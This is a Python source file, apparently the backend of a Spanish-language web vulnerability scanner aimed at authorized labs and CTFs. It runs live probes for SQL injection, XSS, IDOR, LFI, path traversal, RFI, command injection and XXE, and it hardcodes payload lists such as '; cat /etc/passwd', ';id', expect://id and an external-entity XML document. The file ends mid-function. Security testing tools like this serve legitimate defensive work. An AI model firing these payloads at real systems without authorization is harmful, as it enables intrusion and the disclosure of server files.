#!/usr/bin/env python3
"""ht_scanner - backend del scanner GUI de hacking team.
Sirve una web local y ejecuta escaneos REALES (no fake) contra objetivos
autorizados / labs propios. Solo fines educativos / CTF local.

Modulos: headers, archivos, rutas, SQLi, IDOR, XSS, tech
+ soporte de plantillas YAML compatibles con Nuclei (requests definidos por el usuario)
+ control de pausa / reanudar / saltar modulo en vivo.

El frontend pide /api/scan?target=... y recibe eventos via SSE (text/event-stream).
El control (pausar/continuar/saltar) se hace con /api/control?action=...&scan_id=...
"""
import json
import os
import sys
import ssl
import urllib.request
import urllib.parse
import urllib.error
import time
import re
import threading
import uuid
import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer
from http.server import SimpleHTTPRequestHandler

try:
    import yaml
    HAS_YAML = True
except Exception:
    HAS_YAML = False

import pdfgen

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = 8777
REPORTS_DIR = os.path.join(ROOT, "reports")
os.makedirs(REPORTS_DIR, exist_ok=True)

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")

# Wordlists
SENSITIVE = [".env", ".env.local", ".git/config", "wp-config.php", "phpinfo.php",
             "robots.txt", "sitemap.xml", ".well-known/security.txt", "backup.zip",
             "config.php", "xmlrpc.php", "admin/", "login/", "dashboard/",
             "api/", ".aws/credentials"]
ROUTES = ["admin", "login", "dashboard", "api", "config", "panel", "wp-admin",
          "phpmyadmin", "uploads", "backup", ".git", "test", "dev", "staging"]

SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1-- -",
                 "admin' -- -", "0 UNION SELECT 1,2-- -"]
IDOR_PAYLOADS = ["1", "2", "3", "0", "999", "../../etc/passwd"]
XSS_PAYLOADS_DEFAULT = ["<script>alert(1)</script>", "\"<script>alert(1)</script>",
                        "<img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"]

# Estado de escaneos (pause/skip/stop) y OOB ahora viven en core/
# (core.control.STORE y core.oob). Server.py ya no guarda estado global.



def req(method, url, data=None, cookie=None, timeout=10, raw=False):
    """Delegado a core.http.request (capa de red desacoplada)."""
    from core.http import request as _request
    return _request(method, url, data=data, cookie=cookie, timeout=timeout, raw=raw)


def check_control(scan_id, current_module):
    """Delegado a core.control.STORE.check (estado de escaneo)."""
    from core.control import STORE
    return STORE.check(scan_id, current_module)


def start_oob():
    """ Delegado a core.oob.start_oob usando un scan_id global efimero.
    Nota: el nuevo scan_target usa ctx.start_oob() (por scan_id). Este helper
    existe solo para compatibilidad con el scan legacy."""
    return _oob_legacy_start()


_OOB_LEGACY = {}


def _oob_legacy_start():
    import socket, uuid as _uuid
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(5)
    port = srv.getsockname()[1]
    token = "HTSCN" + _uuid.uuid4().hex[:12]
    hit = threading.Event()
    _OOB_LEGACY["token"] = token
    _OOB_LEGACY["hit"] = hit
    _OOB_LEGACY["server"] = srv

    def acceptor():
        srv.settimeout(0.5)
        while not hit.is_set():
            try:
                conn, _ = srv.accept()
            except Exception:
                continue
            try:
                data = conn.recv(4096).decode("utf-8", "replace")
                if token in data:
                    hit.set()
            except Exception:
                pass
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
    threading.Thread(target=acceptor, daemon=True).start()
    return "127.0.0.1", port, token


def stop_oob():
    srv = _OOB_LEGACY.get("server")
    if srv:
        try:
            srv.close()
        except Exception:
            pass
    _OOB_LEGACY.clear()


def wait_oob(timeout=4):
    return _OOB_LEGACY.get("hit", threading.Event()).wait(timeout)


def wait_oob_responsive(scan_id, current_module, timeout=1.2):
    """Delegado a core.oob.wait_oob_responsive (espera OOB con control)."""
    from core.oob import wait_oob_responsive as _w
    return _w(scan_id, current_module, timeout)


def sleep_ctrl(scan_id, current_module, seconds):
    """Duerme pero interrumpe si hay skip/stop."""
    from core.control import STORE
    end = time.time() + seconds
    while time.time() < end:
        ctrl = STORE.check(scan_id, current_module)
        if ctrl in ("skip", "stop"):
            return ctrl
        time.sleep(0.05)
    return "run"


def run_nuclei_templates(scan_id, target, templates, bus, emit):
    """Ejecuta plantillas YAML estilo Nuclei (formato simplificado)."""
    if not HAS_YAML:
        emit({"type": "module", "name": "nuclei", "status": "done",
              "msg": "PyYAML no instalado. Instala con: pip install pyyaml"})
        return
    hits = []
    for tmpl in templates:
        name = tmpl.get("id", "template")
        reqs = tmpl.get("requests", [])
        for r in reqs:
            ctrl = check_control(scan_id, "nuclei")
            if ctrl == "stop":
                emit({"type": "module", "name": "nuclei", "status": "done", "msg": "detenido"})
                return
            if ctrl == "skip":
                break
            method = (r.get("method") or "GET").upper()
            path = r.get("path") or "/"
            full = target.rstrip("/") + path
            # matchers
            matchers = r.get("matchers", [])
            rr = req(method, full)
            match = True
            if matchers:
                match = False
                for m in matchers:
                    mtype = m.get("type")
                    mpart = m.get("part", "body")
                    mwords = m.get("words", [])
                    mstatus = m.get("status", [])
                    content = rr.get("body", "") if mpart in ("body", "raw") else json.dumps(rr.get("headers", {}))
                    if mtype == "word" and any(w.lower() in content.lower() for w in mwords):
                        match = True
                    if mtype == "status" and rr.get("code") in mstatus:
                        match = True
            if match:
                hits.append(name)
                emit({"type": "finding", "severity": (tmpl.get("severity") or "info"),
                      "module": "nuclei", "detail": f"Template '{name}' coincide en {full} (HTTP {rr['code']})"})
        if hits:
            break
    emit({"type": "module", "name": "nuclei", "status": "done",
          "msg": f"Nuclei: {len(hits)} plantilla(s) coincidente(s)"})


def load_templates_from_yaml(text):
    """Carga plantillas tipo Nuclei (dict o lista de dicts)."""
    if not HAS_YAML:
        return []
    try:
        data = yaml.safe_load(text)
    except Exception:
        return []
    if isinstance(data, dict):
        return [data]
    if isinstance(data, list):
        return data
    return []


def load_payloads_from_txt(text):
    """Carga payloads desde .txt con secciones opcionales:
    [SQLi]
    '
    [XSS]
    <script>alert(1)</script>
    [IDOR]
    1
    Las lineas fuera de seccion se aplican a los tres tipos.
    """
    out = {"sqli": [], "xss": [], "idor": []}
    current = None
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        low = line.lower()
        if low in ("[sqli]", "[sql]", "[sql injection]"):
            current = "sqli"; continue
        if low in ("[xss]",):
            current = "xss"; continue
        if low in ("[idor]",):
            current = "idor"; continue
        if current:
            out[current].append(line)
        else:
            out["sqli"].append(line)
            out["xss"].append(line)
            out["idor"].append(line)
    for k in out:
        out[k] = [p for p in out[k] if p]
    return out


def _scan_target_legacy(scan_id, target, bus, templates=None, payloads=None, mode="active"):
    """Ejecuta modulos y emite eventos. Soporta control de pausa/saltar/stop.
    mode='active'  -> ejecuta todos los modulos (incluye envio de payloads)
    mode='passive' -> solo recon (headers, archivos, rutas, tech) sin atacar
    payloads -> dict con listas 'sqli'/'xss'/'idor' para usar en vez de las por defecto.
    """
    def emit(ev):
        bus(ev)
        # Recolectar datos para el reporte PDF
        if ev.get("type") == "finding":
            report_data["findings"].append({
                "severity": ev.get("severity", "low"),
                "module": ev.get("module", ""),
                "detail": ev.get("detail", ""),
            })
        elif ev.get("type") == "module" and ev.get("status") == "done":
            report_data["modules_list"].append({
                "name": ev.get("name", ""),
                "ok": True,
                "msg": ev.get("msg", ""),
            })

    report_data = {
        "findings": [],
        "modules_list": [],
        "system": {"host": "", "server": "", "tech": "", "ports": ""},
    }

    if not target.startswith("http"):
        target = "http://" + target
    mods = ["headers", "archivos", "rutas", "sqli", "idor", "xss", "lfi",
            "traversal", "rfi", "rce", "xxe", "tech"]
    if templates:
        mods = mods + ["nuclei"]
    # Modo pasivo: no enviar payloads (solo superficie)
    if mode == "passive":
        mods = [m for m in mods if m not in ("sqli", "idor", "xss")]
        emit({"type": "mode", "mode": "passive", "msg": "Modo PASIVO: solo recon, sin enviar payloads de ataque"})
    else:
        emit({"type": "mode", "mode": "active", "msg": "Modo ACTIVO: recon + envio de payloads"})
    total = len(mods)
    done = 0

    # Servidor OOB para RFI/XXE (callback local)
    oob_host, oob_port, oob_token = start_oob()
    sqli_list = (payloads or {}).get("sqli") or SQLI_PAYLOADS
    xss_list = (payloads or {}).get("xss") or XSS_PAYLOADS_DEFAULT
    idor_list = (payloads or {}).get("idor") or IDOR_PAYLOADS

    # 1) HEADERS
    ctrl = check_control(scan_id, "headers")
    if ctrl == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "headers", "status": "running", "msg": f"Analizando cabeceras de {target}..."})
    r = req("GET", target)
    issues = []
    h = r.get("headers", {})
    if "strict-transport-security" not in (k.lower() for k in h):
        issues.append("Falta HSTS")
    if "content-security-policy" not in (k.lower() for k in h):
        issues.append("Falta CSP")
    if h.get("x-frame-options") is None and h.get("X-Frame-Options") is None:
        issues.append("Falta X-Frame-Options (clickjacking)")
    if h.get("server"):
        issues.append(f"Server expuesto: {h.get('server')}")
        report_data["system"]["server"] = h.get("server")
    try:
        report_data["system"]["host"] = urllib.parse.urlparse(target).netloc
    except Exception:
        pass
    emit({"type": "module", "name": "headers", "status": "done",
          "msg": f"HTTP {r['code']} | hallazgos: {', '.join(issues) if issues else 'ninguno'}", "findings": issues})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 2) ARCHIVOS
    if check_control(scan_id, "archivos") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "archivos", "status": "running", "msg": "Buscando archivos sensibles expuestos..."})
    found = []
    for f in SENSITIVE:
        if check_control(scan_id, "archivos") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        if check_control(scan_id, "archivos") == "skip":
            break
        rr = req("GET", target.rstrip("/") + "/" + f)
        if rr["code"] in (200, 403) and rr["err"] is None:
            found.append(f"{f} ({rr['code']})")
            emit({"type": "finding", "severity": "medium", "module": "archivos", "detail": f"{f} accesible -> HTTP {rr['code']}"})
        time.sleep(0.05)
    emit({"type": "module", "name": "archivos", "status": "done", "msg": f"Encontrados: {len(found)}", "findings": found})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 3) RUTAS
    if check_control(scan_id, "rutas") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "rutas", "status": "running", "msg": "Enumerando rutas/endpoints..."})
    rfound = []
    for rt in ROUTES:
        if check_control(scan_id, "rutas") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        if check_control(scan_id, "rutas") == "skip":
            break
        rr = req("GET", target.rstrip("/") + "/" + rt)
        if rr["code"] in (200, 301, 302, 403) and rr["err"] is None:
            rfound.append(f"/{rt} ({rr['code']})")
            emit({"type": "finding", "severity": "low", "module": "rutas", "detail": f"/{rt} -> HTTP {rr['code']}"})
        time.sleep(0.05)
    emit({"type": "module", "name": "rutas", "status": "done", "msg": f"Rutas: {len(rfound)}", "findings": rfound})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    if mode == "active":
        # 4) SQLi
        if check_control(scan_id, "sqli") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "sqli", "status": "running", "msg": "Probando inyeccion SQL en parametros GET..."})
        sqli_hits = []
        SQLI_ERRORS = ["error in your sql", "sql syntax", "sqlite", "you have an error",
                       "unclosed quotation mark", "sqlstate", "ora-", "pg_", "warning: mysqli",
                       "microsoft sql server", "syntax error", "near \"", "unrecognized token",
                       "operationalerror", "database error", "could not"]
        sqli_paths = ["", "/notes", "/doc", "/article", "/view", "/product", "/item", "/post", "/news"]
        for sp in sqli_paths:
            base_url = target.rstrip("/") + sp
            for param in ["id", "q", "page", "search", "note", "cat", "pid"]:
                base = req("GET", base_url, {param: "1"})
                base_len = len(base.get("body", ""))
                base_code = base.get("code")
                for p in sqli_list:
                    if check_control(scan_id, "sqli") == "stop":
                        emit({"type": "done", "summary": "Escaneo detenido"}); return
                    if check_control(scan_id, "sqli") == "skip":
                        break
                    rr = req("GET", base_url, {param: p})
                    body_l = rr.get("body", "").lower()
                    hit = False
                    if any(s in body_l for s in SQLI_ERRORS):
                        hit = True
                    elif rr.get("code") != base_code and rr.get("code") != 0:
                        hit = True
                    elif abs(len(rr.get("body", "")) - base_len) > 80:
                        hit = True
                    if hit:
                        sqli_hits.append(f"{sp or '/'}{param}={p}")
                        emit({"type": "finding", "severity": "high", "module": "sqli",
                              "detail": f"Posible SQLi en '{base_url}' param '{param}' con: {p}"})
                        break
                    time.sleep(0.03)
                if sqli_hits:
                    break
            if sqli_hits:
                break
        emit({"type": "module", "name": "sqli", "status": "done", "msg": f"SQLi: {len(sqli_hits)} hallazgo(s)", "findings": sqli_hits})
        done += 1
        emit({"type": "progress", "done": done, "total": total})

        # 5) IDOR
        if check_control(scan_id, "idor") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "idor", "status": "running", "msg": "Probando IDOR (enumeracion de objetos por id)..."})
        idor_hits = []
        idor_paths = ["", "/doc", "/note", "/file", "/user", "/account", "/profile", "/view"]
        for ip in idor_paths:
            base_url = target.rstrip("/") + ip
            for idparam in ["id", "doc", "uid", "user", "file", "pid"]:
                for pid in idor_list:
                    if check_control(scan_id, "idor") == "stop":
                        emit({"type": "done", "summary": "Escaneo detenido"}); return
                    if check_control(scan_id, "idor") == "skip":
                        break
                    rr = req("GET", base_url, {idparam: pid})
                    if (rr.get("code") == 200 and len(rr.get("body", "")) > 30
                            and "not found" not in rr.get("body", "").lower()
                            and "404" not in rr.get("body", "")):
                        idor_hits.append(f"{ip or '/'}{idparam}={pid}")
                        emit({"type": "finding", "severity": "medium", "module": "idor",
                              "detail": f"Objeto {base_url} {idparam}={pid} accesible (revisar control de acceso)"})
                        break
                if idor_hits:
                    break
            if idor_hits:
                break
        emit({"type": "module", "name": "idor", "status": "done", "msg": f"IDOR: {len(idor_hits)} sospechoso(s)", "findings": idor_hits})
        done += 1
        emit({"type": "progress", "done": done, "total": total})

        # 6) XSS
        if check_control(scan_id, "xss") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "xss", "status": "running", "msg": "Probando XSS reflejado en parametros GET..."})
        xss_hits = []
        XSS_PATHS = ["", "/search", "/buscar", "/q", "/s", "/find"]
        for xp in XSS_PATHS:
            base_url = target.rstrip("/") + xp
            for param in ["q", "search", "s", "id", "name", "term"]:
                for p in xss_list:
                    if check_control(scan_id, "xss") == "stop":
                        emit({"type": "done", "summary": "Escaneo detenido"}); return
                    if check_control(scan_id, "xss") == "skip":
                        break
                    rr = req("GET", base_url, {param: p})
                    if p in (rr.get("body", "") or "") and rr.get("code") == 200:
                        xss_hits.append(f"{base_url} {param}")
                        emit({"type": "finding", "severity": "high", "module": "xss",
                              "detail": f"XSS reflejado en '{base_url}' param '{param}': payload no filtrado"})
                        break
                if xss_hits:
                    break
            if xss_hits:
                break
        emit({"type": "module", "name": "xss", "status": "done", "msg": f"XSS: {len(xss_hits)} hallazgo(s)", "findings": xss_hits})
        done += 1
        emit({"type": "progress", "done": done, "total": total})
    else:
        # Modo pasivo: omitir ataque, marcar como omitido para keep progreso consistente
        for nm in ("sqli", "idor", "xss"):
            emit({"type": "module", "name": nm, "status": "done", "msg": "Omitido (modo pasivo)"})
            done += 1
            emit({"type": "progress", "done": done, "total": total})

    # 7) LFI (Local File Inclusion) - parametros que cargan archivos locales
    if check_control(scan_id, "lfi") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "lfi", "status": "running", "msg": "Probando LFI (inclusion de archivos locales)..."})
    lfi_hits = []
    LFI_ROUTES = ["", "/file", "/page", "/index.php", "/view", "/download", "/read"]
    LFI_PARAMS = ["file", "page", "path", "inc", "include", "lang", "doc", "view", "template"]
    LFI_PAYLOADS = ["/etc/passwd", "../../../../../../etc/passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "expect://id", "data://text/plain;base64,SSBsb3ZlIGh0"]
    for rt in LFI_ROUTES:
        base_url = target.rstrip("/") + rt
        for param in LFI_PARAMS:
            for p in LFI_PAYLOADS:
                if check_control(scan_id, "lfi") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "lfi") == "skip":
                    break
                rr = req("GET", base_url, {param: p})
                if rr.get("code") == 200 and ("root:" in rr.get("body", "") or
                                               "bin/bash" in rr.get("body", "") or
                                               "<?php" in rr.get("body", "")):
                    lfi_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "high", "module": "lfi",
                          "detail": f"LFI en '{base_url}' param '{param}' con: {p} (contenido de archivo expuesto)"})
                    break
                time.sleep(0.02)
            if lfi_hits:
                break
        if lfi_hits:
            break
    emit({"type": "module", "name": "lfi", "status": "done", "msg": f"LFI: {len(lfi_hits)} hallazgo(s)", "findings": lfi_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 8) Path Traversal (directory traversal directo en rutas/params)
    if check_control(scan_id, "traversal") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "traversal", "status": "running", "msg": "Probando Path Traversal (../)..."})
    trv_hits = []
    TRV_ROUTES = ["", "/download", "/file"]
    TRV_PARAMS = ["file", "path", "name", "img"]
    TRV_PAYLOADS = ["../../../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
    for rt in TRV_ROUTES:
        base_url = target.rstrip("/") + rt
        for param in TRV_PARAMS:
            for p in TRV_PAYLOADS:
                if check_control(scan_id, "traversal") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "traversal") == "skip":
                    break
                rr = req("GET", base_url, {param: p})
                if rr.get("code") == 200 and ("root:" in rr.get("body", "") or
                                               "[extensions]" in rr.get("body", "") or
                                               "for 16-bit app support" in rr.get("body", "").lower()):
                    trv_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "high", "module": "traversal",
                          "detail": f"Path Traversal en '{base_url}' param '{param}' con: {p}"})
                    break
                time.sleep(0.02)
            if trv_hits:
                break
        if trv_hits:
            break
    emit({"type": "module", "name": "traversal", "status": "done", "msg": f"Traversal: {len(trv_hits)} hallazgo(s)", "findings": trv_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 9) RFI (Remote File Inclusion) - incluye un recurso externo controlado
    if check_control(scan_id, "rfi") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "rfi", "status": "running", "msg": "Probando RFI (inclusion remota) via callback OOB..."})
    rfi_hits = []
    RFI_TARGETS = ["/include"]
    RFI_PARAMS = ["url"]
    # URL del callback local: el server objetivo intentaria cargar este recurso
    cb_url = f"http://{oob_host}:{oob_port}/{oob_token}.txt"
    for rt in RFI_TARGETS:
        base_url = target.rstrip("/") + rt
        for param in RFI_PARAMS:
            for p in [cb_url]:
                if check_control(scan_id, "rfi") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "rfi") == "skip":
                    break
                rr = req("GET", base_url, {param: p}, timeout=5)
                if wait_oob_responsive(scan_id, "rfi", 1.2):
                    rfi_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "high", "module": "rfi",
                          "detail": f"RFI OOB en '{base_url}' param '{param}': el servidor intento cargar {p}"})
                    break
                time.sleep(0.01)
            if rfi_hits:
                break
        if rfi_hits:
            break
    emit({"type": "module", "name": "rfi", "status": "done", "msg": f"RFI: {len(rfi_hits)} hallazgo(s) (OOB)", "findings": rfi_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 10) RCE (command injection en parametros)
    if check_control(scan_id, "rce") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "rce", "status": "running", "msg": "Probando RCE (inyeccion de comandos)..."})
    rce_hits = []
    RCE_ROUTES = ["", "/ping", "/cmd", "/exec", "/run", "/api/exec", "/cgi-bin/test"]
    RCE_PARAMS = ["cmd", "command", "exec", "query", "ip", "host", "ping", "url", "input", "q"]
    RCE_PAYLOADS = [";id", "|id", "`id`", "$(id)", "&&id", "; cat /etc/passwd",
                    "| whoami", "';id;'", "||id", "& echo HTSCNRCE"]
    for rt in RCE_ROUTES:
        base_url = target.rstrip("/") + rt
        if rce_hits: break
        for param in RCE_PARAMS:
            if rce_hits: break
            for p in RCE_PAYLOADS:
                if check_control(scan_id, "rce") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "rce") == "skip":
                    break
                rr = req("GET", base_url, {param: p}, timeout=5)
                body = (rr.get("body", "") or "")
                if ("uid=" in body and "gid=" in body) or "HTSCNRCE" in body or \
                   ("root:x:" in body and len(body) > 50):
                    rce_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "critical", "module": "rce",
                          "detail": f"RCE en '{base_url}' param '{param}' con: {p}"})
                    break
                time.sleep(0.02)
    emit({"type": "module", "name": "rce", "status": "done", "msg": f"RCE: {len(rce_hits)} hallazgo(s)", "findings": rce_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 11) XXE (XML External Entity) - OOB via callback local
    if check_control(scan_id, "xxe") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "xxe", "status": "running", "msg": "Probando XXE (entidad externa) via callback OOB..."})
    xxe_hits = []
    XXE_ENDPOINTS = ["/", "/xml"]
    payload = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}:{oob_port}/{oob_token}">]>'
        f'<foo>&xxe;</foo>'
    )
    for ep in XXE_ENDPOINTS:
        if check_control(scan_id, "xxe") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        if check_control(scan_id, "xxe") == "skip":
            break
        rr = req("POST", target.rstrip("/") + ep, data=payload, raw=True, timeout=5)
        if wait_oob_responsive(scan_id, "xxe", 1.2):
            xxe_hits.append(ep or "/")
            emit({"type": "finding", "severity": "high", "module": "xxe",
                  "detail": f"XXE OOB en '{ep or '/'}' (el parser solicitó recurso externo)"})
            break
        time.sleep(0.02)
    emit({"type": "module", "name": "xxe", "status": "done", "msg": f"XXE: {len(xxe_hits)} hallazgo(s) (OOB)", "findings": xxe_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    stop_oob()

    # 12) TECH
    if check_control(scan_id, "tech") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "tech", "status": "running", "msg": "Detectando tecnologia (server, CMS, frameworks)..."})
    tech_hits = []
    rh = req("GET", target)
    h = rh.get("headers", {})
    server_hdr = h.get("server") or h.get("Server")
    if server_hdr:
        tech_hits.append(f"Server: {server_hdr}")
    powered = h.get("x-powered-by") or h.get("X-Powered-By")
    if powered:
        tech_hits.append(f"Powered-by: {powered}")
    body_l = (rh.get("body", "") or "").lower()
    if "wordpress" in body_l:
        tech_hits.append("CMS: WordPress")
    if "drupal" in body_l:
        tech_hits.append("CMS: Drupal")
    if "laravel" in body_l or "csrf-token" in body_l:
        tech_hits.append("Framework: Laravel/PHP")
    if "next.js" in body_l or "_next" in body_l:
        tech_hits.append("Framework: Next.js")
    if "react" in body_l:
        tech_hits.append("Framework: React")
    if "jquery" in body_l:
        tech_hits.append("Lib: jQuery")
    report_data["system"]["tech"] = ", ".join(tech_hits) if tech_hits else "no detectada"
    emit({"type": "module", "name": "tech", "status": "done", "msg": f"Tech: {len(tech_hits)} senal(es)", "findings": tech_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 8) NUCLEI (plantillas YAML del usuario)
    if templates:
        if check_control(scan_id, "nuclei") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "nuclei", "status": "running", "msg": "Ejecutando plantillas YAML (estilo Nuclei)..."})
        run_nuclei_templates(scan_id, target, templates, bus, emit)
        done += 1
        emit({"type": "progress", "done": done, "total": total})

    # --- Generar reporte PDF firmado por hacking team ---
    try:
        report_data["target"] = target
        report_data["fecha"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        report_data["mode"] = mode
        report_data["modulos"] = total
        pdf_path = os.path.join(REPORTS_DIR, f"{scan_id}.pdf")
        pdfgen.generate_report(report_data, pdf_path)
        emit({"type": "report", "path": pdf_path,
              "msg": f"Reporte PDF generado: {os.path.basename(pdf_path)}"})
    except Exception as e:
        emit({"type": "error", "msg": f"No se pudo generar el PDF: {e}"})

    emit({"type": "done", "target": target, "summary": f"Escaneo completado. Modulos: {total}. Revisa los hallazgos."})


def scan_target(scan_id, target, bus, templates=None, payloads=None, mode="active",
               auth=None, concurrency=4, profile="full"):
    """Nueva orquestacion de HTScanner (v2):
      * Concurrencia por modulo (hilos + semaforo).
      * Sesion/auth opcional (cookie jar).
      * Crawler que alimenta los modulos de ataque.
      * Fingerprinting, descubrimiento de archivos, analizador JS.
      * Plugins cargados dinamicamente desde plugins/.
      * Confirmacion de hallazgos (menos falsos positivos).
      * Priorizacion + correlacion + sugerencias (IA local).
      * Exporta evidencias y multiples formatos (PDF/HTML/JSON/MD/Nuclei/Burp).
    """
    import engine
    import crawler
    import fingerprint
    import discovery
    import jsecret
    import risk
    import exporters

    if not target.startswith("http"):
        target = "http://" + target

    # ---- EventBus desacoplado ----
    from core.eventbus import EventBus
    from core.control import STORE
    bus_obj = EventBus()
    bus_obj.subscribe("*", bus)  # todo evento se publica al SSE (frontend)
    STORE.create(scan_id)        # registrar estado del scan (pause/skip/stop)
    t0 = time.time()             # para medir duracion del escaneo

    ctx = engine.ScanContext(scan_id, target, bus_obj, mode=mode,
                              auth=auth, concurrency=concurrency)

    # ---- sesion / auth ----
    engine.establish_session(ctx)

    # ---- modulo: headers (basico, rapido, lo dejamos sincrono al inicio) ----
    ctx.emit({"type": "module", "name": "headers", "status": "running",
              "msg": f"Analizando cabeceras de {target}..."})
    r = ctx.req("GET", target)
    h = {k.lower(): v for k, v in (r.get("headers", {}) or {}).items()}
    issues = []
    if "strict-transport-security" not in h:
        issues.append("Falta HSTS")
    if "content-security-policy" not in h:
        issues.append("Falta CSP")
    if h.get("x-frame-options") is None:
        issues.append("Falta X-Frame-Options (clickjacking)")
    if h.get("server"):
        issues.append(f"Server expuesto: {h.get('server')}")
        ctx._report["system"]["server"] = h.get("server")
    try:
        ctx._report["system"]["host"] = urllib.parse.urlparse(target).netloc
    except Exception:
        pass
    ctx.emit({"type": "module", "name": "headers", "status": "done",
              "msg": f"HTTP {r['code']} | hallazgos: {', '.join(issues) if issues else 'ninguno'}",
              "findings": issues})
    d, t = ctx.record_progress()

    # ---- fingerprinting + crawler + discovery + jsecret + tech (recon) ----
    recon_runners = {}

    def run_fingerprint(c):
        info = fingerprint.fingerprint(c)
        c._report["system"]["tech"] = ", ".join(info.get("tech", [])) or "no detectada"
        c._report["system"]["ports"] = ", ".join(
            [str(x) for x in info.get("dns", {}).get("a", [])][:5]) or ""
        # emitir como modulo 'tech'
        findings = []
        for tech in info.get("tech", []):
            findings.append(tech + (f" {info['versions'].get(tech)}" if info["versions"].get(tech) else ""))
        for w in info.get("waf", []):
            findings.append(f"WAF: {w}")
        c.emit({"type": "module", "name": "tech", "status": "done",
                "msg": f"Tech: {len(findings)} senal(es): {', '.join(findings)[:200]}",
                "findings": findings})
        c._fingerprint = info
        c.emit({"type": "recon", "kind": "fingerprint", "data": info})
        # emitir cloud / admin_panels / js_libs como hallazgos info
        for cloud in info.get("cloud", []):
            ctx.emit({"type": "finding", "severity": "info", "module": "tech",
                    "confidence": "sospechoso",
                    "detail": f"Proveedor cloud detectado: {cloud}"})
        for panel in info.get("admin_panels", []):
            ctx.emit({"type": "finding", "severity": "medium", "module": "tech",
                      "confidence": "sospechoso",
                      "detail": f"Panel expuesto (por URL/body): {panel}"})
        for lib in info.get("js_libs", []):
            ctx.emit({"type": "finding", "severity": "low", "module": "tech",
                      "confidence": "sospechoso",
                      "detail": f"Librería JS potencialmente vulnerable (heurística): {lib}"})

    def run_crawler(c):
        data = crawler.crawl(c)
        c._crawl = data
        urls = sorted(data.get("urls", []))
        apis = sorted(data.get("apis", []))
        spa = sorted(data.get("spa_routes", []))
        redirs = sorted(data.get("redirects", []))
        c.emit({"type": "module", "name": "crawler", "status": "done",
                "msg": f"Crawler: {len(urls)} URLs, {len(data.get('forms',[]))} formularios, "
                      f"{len(data.get('params',[]))} params, {len(apis)} APIs, "
                      f"{len(spa)} rutas SPA, {len(redirs)} redirects",
                "findings": apis + spa[:10]})
        c.emit({"type": "recon", "kind": "crawler", "data": {
            "urls": urls[:50], "apis": apis,
            "js_endpoints": sorted(data.get("js_endpoints", []))[:50],
            "spa_routes": spa[:50], "redirects": redirs[:50]}})
        # rutas SPA y redirects como hallazgos INFO (superficie ampliada)
        for r in spa:
            c.emit({"type": "finding", "severity": "info", "module": "crawler",
                    "detail": f"Ruta SPA descubierta: {r}"})
        for r in redirs:
            c.emit({"type": "finding", "severity": "info", "module": "crawler",
                    "detail": f"Redireccion 3xx -> {r}"})

    def run_discovery(c):
        found = discovery.discover(c)
        c.emit({"type": "module", "name": "archivos", "status": "done",
                "msg": f"Archivos: {len(found)} encontrado(s)", "findings": [f[0] for f in found]})

